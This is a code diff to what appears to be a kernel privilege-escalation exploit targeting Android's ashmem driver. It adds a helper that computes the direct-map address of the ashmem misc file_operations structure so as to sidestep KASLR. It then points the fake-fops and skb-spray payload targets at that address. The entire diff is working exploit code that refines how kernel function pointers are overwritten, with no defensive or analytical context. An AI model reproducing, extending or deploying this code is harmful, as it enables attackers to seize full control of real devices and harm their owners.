@@ -352,6 +352,12 @@ uintptr_t data_addr(uintptr_t image_addr) {
   return p0_data_alias(image_addr) + slide_p0_offset;
 }
 
+uintptr_t misc_fops_data_addr(void) {
+  // The direct-map alias is physical and is not shifted by virtual KASLR.
+  return p0_data_alias(ASHMEM_MISC_FOPS) +
+         (ASHMEM_MISC_FOPS_FIELD_OFF - ASHMEM_MISC_FOPS_OFF);
+}
+
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
   if (!kaslr_done) {
     return image_addr;
@@ -636,12 +642,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
     slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+    slide_bank_targets[0] = misc_fops_data_addr();
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = misc_fops_data_addr();
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
@@ -685,6 +691,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
 #endif
     waiter_prio = SLIDE_FAKE_WAITER_PRIO;
+  } else {
+    write_right = misc_fops_data_addr();
   }
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
